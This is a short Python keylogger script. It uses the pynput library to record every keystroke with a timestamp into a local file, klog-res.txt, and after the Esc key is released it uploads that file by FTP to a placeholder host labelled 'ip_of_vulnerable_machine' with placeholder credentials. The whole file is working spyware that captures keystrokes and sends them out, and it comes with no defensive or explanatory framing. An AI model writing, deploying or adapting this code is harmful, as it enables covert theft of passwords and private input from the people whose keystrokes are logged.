from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir + "klog-res.txt"), level=logging.DEBUG, format="%(asctime)s:%(message)s")

def pressingKey(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))

def releasingKey(key):
    if key == Key.esc:
        return False

print("\nStarted listening...\n")

with Listener(on_press=pressingKey, on_release=releasingKey) as listener:
    listener.join()

print("\nConnecting to the FTP and sending data...")

sess = ftplib.FTP("ip_of_vulnerable_machine", "username", "password")
file = open("klog-res.txt", "rb")
sess.storbinary("STOR klog-res.txt", file)
file.close()
sess.quit()
